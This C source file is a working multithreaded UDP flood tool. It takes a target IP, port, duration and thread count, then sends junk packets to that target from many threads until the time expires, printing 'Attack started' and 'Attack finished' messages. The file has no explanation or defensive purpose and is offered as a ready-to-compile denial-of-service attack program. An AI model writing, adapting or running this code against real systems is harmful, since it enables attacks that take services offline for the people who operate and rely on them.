#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>

#define PAYLOAD_SIZE 20

// Struct to hold attack parameters
typedef struct {
    char *ip;
    int port;
    int duration;
} Attack;

// Global flag to handle program termination gracefully
volatile sig_atomic_t stop = 0;

// Function to handle SIGINT signal (Ctrl+C)
void handle_sigint(int sig) {
    printf("\nStopping attack...\n");
    stop = 1;
}

// Function to generate a random payload
void generate_payload(char *buffer, size_t size) {
    const char hex_chars[] = "0123456789abcdef";
    for (size_t i = 0; i < size; i++) {
        buffer[i * 4] = '\\';
        buffer[i * 4 + 1] = 'x';
        buffer[i * 4 + 2] = hex_chars[rand() % 16];
        buffer[i * 4 + 3] = hex_chars[rand() % 16];
    }
    buffer[size * 4] = '\0';
}

// Function for the attack logic (this is called in each thread)
void *attack_thread(void *arg) {
    Attack *attack = (Attack *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    char payload[PAYLOAD_SIZE * 4 + 1];

    // Generate payload
    generate_payload(payload, PAYLOAD_SIZE);

    // Create UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(attack->port);
    server_addr.sin_addr.s_addr = inet_addr(attack->ip);

    // Set end time for the attack based on duration
    endtime = time(NULL) + attack->duration;
    
    // Continuously send the payload until the time expires
    while (!stop && time(NULL) <= endtime) {
        ssize_t payload_size = strlen(payload);
        if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    return NULL;
}

// Function to print the usage of the program
void usage() {
    printf("Usage: ./attack ip port duration threads\n");
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    // Handle Ctrl+C gracefully
    signal(SIGINT, handle_sigint);

    pthread_t *thread_ids = (pthread_t *)malloc(threads * sizeof(pthread_t));
    if (!thread_ids) {
        perror("Memory allocation failed for threads");
        exit(1);
    }

    Attack *attack = (Attack *)malloc(sizeof(Attack));
    if (!attack) {
        perror("Memory allocation failed for attack");
        free(thread_ids);
        exit(1);
    }

    attack->ip = ip;
    attack->port = port;
    attack->duration = duration;

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, duration, threads);

    // Create threads to perform the attack
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack_thread, (void *)attack) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            free(attack);
            exit(1);
        }
    }

    // Wait for threads to finish
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("Attack finished. Exiting...\n");

    free(thread_ids);
    free(attack);
    return 0;
}